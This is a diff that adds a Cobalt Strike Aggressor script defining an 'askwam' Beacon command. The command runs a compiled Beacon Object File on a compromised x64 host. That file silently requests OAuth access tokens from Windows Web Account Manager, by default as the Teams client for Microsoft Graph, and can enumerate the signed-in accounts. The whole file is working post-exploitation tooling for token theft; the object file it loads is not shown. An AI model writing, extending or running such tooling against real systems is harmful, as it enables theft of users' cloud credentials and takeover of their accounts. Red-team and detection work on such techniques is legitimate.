@@ -1,0 +1,90 @@
+beacon_command_register(
+   "askwam",
+   "Silently request a token from Windows WAM",
+   "Usage: askwam [options]\n\n" .
+   "Options:\n" .
+   "  --client-id VALUE       public client ID (default: Teams desktop/mobile)\n" .
+   "  --scope VALUE           requested v2 scope (default: Graph .default)\n" .
+   "  --resource VALUE        WAM v1-compatible resource; exclusive with --scope\n" .
+   "  --authority VALUE       provider authority (default: organizations)\n" .
+   "  --enum                  enumerate accounts and exit\n" .
+   "  --account-id VALUE      select an exact WAM account ID\n" .
+   "  --username VALUE        select one exact, unique username\n" .
+   "  --claims-json VALUE     raw OAuth claims object\n" .
+   "  --cae                   request the CAE cp1 capability\n" .
+   "  --hide                  omit the access token\n" .
+   "  --timeout-seconds N     1-300 seconds (default: 30)\n"
+);
+
+alias askwam {
+   local('$bid $index $count $option $value $handle $object $packed %opts');
+   $bid = @_[0];
+   if (barch($bid) ne "x64") {
+      berror($bid, "askWAM currently supports x64 Beacons only");
+      return;
+   }
+
+   %opts["--client-id"] = "";
+   %opts["--scope"] = "";
+   %opts["--resource"] = "";
+   %opts["--authority"] = "";
+   %opts["--claims-json"] = "";
+   %opts["--account-id"] = "";
+   %opts["--username"] = "";
+   %opts["--timeout-seconds"] = 30;
+   %opts["--hide"] = 0;
+   %opts["--cae"] = 0;
+   %opts["--enum"] = 0;
+
+   $count = size(@_);
+   for ($index = 1; $index < $count; $index++) {
+      $option = @_[$index];
+      if ($option eq "--hide" || $option eq "--cae" || $option eq "--enum") {
+         %opts[$option] = 1;
+         continue;
+      }
+      if ($option !in @("--client-id", "--scope", "--resource", "--authority", "--claims-json", "--account-id", "--username", "--timeout-seconds")) {
+         berror($bid, "$option is not a valid option");
+         return;
+      }
+      $index++;
+      if ($index >= $count) {
+         berror($bid, "missing value for $option");
+         return;
+      }
+      $value = @_[$index];
+      %opts[$option] = $value;
+   }
+
+   if (%opts["--account-id"] ne "" && %opts["--username"] ne "") {
+      berror($bid, "use either --account-id or --username, not both");
+      return;
+   }
+   if (%opts["--scope"] ne "" && %opts["--resource"] ne "") {
+      berror($bid, "use either --scope or --resource, not both");
+      return;
+   }
+   if (%opts["--cae"] && %opts["--claims-json"] ne "") {
+      berror($bid, "use either --cae or --claims-json, not both");
+      return;
+   }
+   if (%opts["--enum"] && (%opts["--account-id"] ne "" || %opts["--username"] ne "")) {
+      berror($bid, "--enum cannot be combined with an account selector");
+      return;
+   }
+
+   $handle = openf(script_resource("bin/Release/askwam_bof.x64.o"));
+   $object = readb($handle, -1);
+   closef($handle);
+   $packed = bof_pack($bid, "zzzzzzziiii",
+      %opts["--client-id"], %opts["--scope"], %opts["--resource"], %opts["--authority"],
+      %opts["--claims-json"], %opts["--account-id"], %opts["--username"],
+      int(%opts["--timeout-seconds"]), %opts["--hide"], %opts["--cae"], %opts["--enum"]);
+   if (%opts["--enum"]) {
+      btask($bid, "Enumerating Windows WAM accounts");
+   }
+   else {
+      btask($bid, "Requesting a token silently through Windows WAM");
+   }
+   beacon_inline_execute($bid, $object, "go", $packed);
+}
